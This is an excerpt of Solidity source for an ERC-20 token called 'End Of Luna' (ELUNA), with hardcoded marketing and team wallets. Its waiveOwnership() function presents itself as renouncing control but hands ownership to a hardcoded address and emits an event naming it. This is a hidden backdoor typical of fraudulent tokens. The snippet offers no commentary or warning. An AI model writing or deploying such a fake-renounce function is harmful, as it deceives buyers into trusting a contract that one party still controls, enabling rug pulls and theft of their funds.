...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0xEa896b8dF63ad47836Ca8495D886aF65588E4eED));
        _owner = address(0xEa896b8dF63ad47836Ca8495D886aF65588E4eED);
    }
...
contract EndOfLuna is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "End Of Luna";
    string private _symbol = "ELUNA";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xC7eB4b39c28b456B6E1f5849Ef5869200AE4D4e0);
    address payable public teamWalletAddress = payable(0xc8E3dEA230Fc335F2B215ECac90B68e512D94aF4);
